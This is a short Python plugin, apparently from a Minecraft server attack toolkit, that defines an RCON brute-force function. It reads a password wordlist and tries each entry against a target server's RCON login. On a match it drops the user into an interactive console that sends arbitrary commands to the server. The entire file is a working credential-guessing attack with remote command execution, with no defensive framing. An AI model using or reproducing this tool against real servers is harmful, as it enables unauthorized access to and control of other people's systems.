from mcrcon import MCRcon
from plugins.common import *

def rconbrut(server, file):
    if checkserver(server) == False: error('Please input a real domain or server'); return
    try:
        with open(file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        for password in passwords:
            try:
                with MCRcon(server, password) as mcr:
                    success(f'Found Password! {password}')
                    info('Type "exit" to exit the rcon client')

                    while True:
                        rcmd = input(f'{yellow}/')
                        if rcmd == 'exit': mcr.disconnect(); return
                        resp = mcr.command(f"/{rcmd}")
                        print(resp)

            except Exception:
                continue

        error('Could not find a valid RCON password.')

    except Exception as e:
        error(str(e))
